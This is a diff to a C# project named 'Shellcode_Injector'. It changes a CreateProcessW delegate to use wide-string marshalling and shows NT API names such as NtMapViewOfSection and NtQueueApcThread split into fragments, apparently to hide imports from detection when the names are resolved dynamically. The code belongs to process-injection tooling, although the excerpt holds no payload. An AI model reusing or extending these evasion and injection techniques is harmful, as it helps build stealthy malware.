@@ -116,9 +116,17 @@ namespace Shellcode_Injector
         //CreateProcessW - string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
         // ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
         //    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation
-        public delegate bool CPW(string app, string cmd, ref SATTR proc_attr,
-            ref SATTR thread_attr, bool inh_hand, uint cflags, IntPtr env,
-            string cwd, ref SIN str_info, out PIN proc_info);
+        public delegate bool CPW(
+            [MarshalAs(UnmanagedType.LPWStr)] string app, 
+            string cmd, 
+            ref SATTR proc_attr,
+            ref SATTR thread_attr, 
+            bool inh_hand, 
+            uint cflags, 
+            IntPtr env,
+            [MarshalAs(UnmanagedType.LPWStr)]  string cwd, 
+            ref SIN str_info, 
+            out PIN proc_info);
 
         //ntdll.dll delegation definitions
         //NtCreateSection - out hSection, ulong desired_access, IntPtr object_attributes,
@@ -182,6 +190,7 @@ namespace Shellcode_Injector
             mymap.Add("nmvs", new List<string> { "N", "tMap", "Vi", "ewO", "fSe", "ct", "ion" });
             mymap.Add("ncte", new List<string> { "N", "tCr", "eat", "eTh", "read", "Ex" });
             mymap.Add("nqat", new List<string> { "N", "tQ", "ue", "ueA", "pc", "Th","read" });
+
 
             //Get function pointers trough LoadLibraryA and GetProcAddress
             IntPtr main_lib = LLA(string.Join("", mymap["ml"]));
